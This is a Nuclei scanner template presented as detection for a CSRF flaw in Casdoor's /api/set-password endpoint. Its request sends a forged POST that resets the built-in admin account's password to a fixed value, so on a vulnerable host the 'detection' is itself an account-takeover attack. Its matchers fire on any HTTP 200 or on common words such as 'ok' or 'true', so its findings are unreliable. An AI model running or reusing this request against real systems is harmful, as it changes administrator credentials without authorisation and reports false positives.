# casdoor-csrf-detect.yaml
id: cve-2023-34927-casdoor-csrf-detect

info:
  name: Casdoor - /api/set-password CSRF (detection)
  author: adapted-by-chatgpt-for-vijay
  severity: high
  description: >
    Detects potential Cross-Site Request Forgery (CSRF) vulnerability on Casdoor's /api/set-password endpoint
    by sending a forged POST request that sets a password. This template checks for HTTP 200 or body indicators
    that suggest the request succeeded. Validate manually before acting.
  reference:
    - https://github.com/casdoor/casdoor
    - https://github.com/casdoor/casdoor/releases/tag/v2.95.0
  tags: cve2023,csrf,casdoor

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/set-password"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: nuclei-scanner
    body: "userOwner=built-in&userName=admin&newPassword=P@ssw0rd123"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "ok"
          - "true"
          - "password"
          - "set"
      - type: regex
        part: body
        regex:
          - "password.*set"
          - "set.*password"
